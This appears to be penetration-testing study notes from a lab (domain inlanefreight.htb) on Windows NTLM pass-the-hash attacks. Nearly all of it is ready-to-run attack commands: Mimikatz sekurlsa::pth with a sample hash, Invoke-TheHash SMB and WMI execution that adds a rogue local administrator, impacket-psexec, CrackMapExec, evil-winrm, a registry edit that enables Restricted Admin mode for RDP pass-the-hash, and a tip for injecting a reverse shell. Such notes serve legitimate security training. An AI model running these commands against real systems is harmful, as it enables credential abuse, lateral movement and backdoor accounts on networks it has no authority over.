---------------------------
# Windows NTLM Introduction
-------------------------
- Using Mimikatz
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

	# Options
	/user - The username we want to impersonate
	/rc4 or /NTLM - NTLM hash of the user's password
	/domain - Domain the user to impersonate belongs to.
	/run - the program we want to run once logged in	
```

- PowerShell Invoke-TheHash
```PowerShell
# Invoke-TheHash with SMB
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target $IP -Domain $DOMAIN -Username $USERNAME -Hash $HASH -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# Note we can create a reverse shell from this command
# Go to this page to set up a revesere shell https://www.revshells.com/
# Paste whatever generated into the -Command flag
```

```PowerShell
# Invoke-TheHash with WMI
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target $IP -Domain $DOMAIN -Username $USERNAME -Hash $HASH -Command $COMMAND
```

- Pass the Hash with Impacket PsExec
```bash
impacket-psexec administrator@$IP -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

- Pass the Hash with CrackMapExec
```bash
crackmapexec smb $IP -u $USERNAME -d . -H $HASH

# Execute command with CrackMapExec
crackmapexec smb $Ip -u $USERNAME -d . -H $HASH -x $COMMAND
```

- Pass the Hash with evil-winrm
```bash
evil-winrm -i $IP -u $USERNAME -H $HASH
```

- Pass the Hash with RDP
	-Precondition: Restricted Admin Mode must be enabled on the TARGET
	```cmd
	reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
	```
	-Run xfreerdp with /pth flag
```bash
xfreerdp /v:$IP /u:$USERNAME /pth:$HASH
```

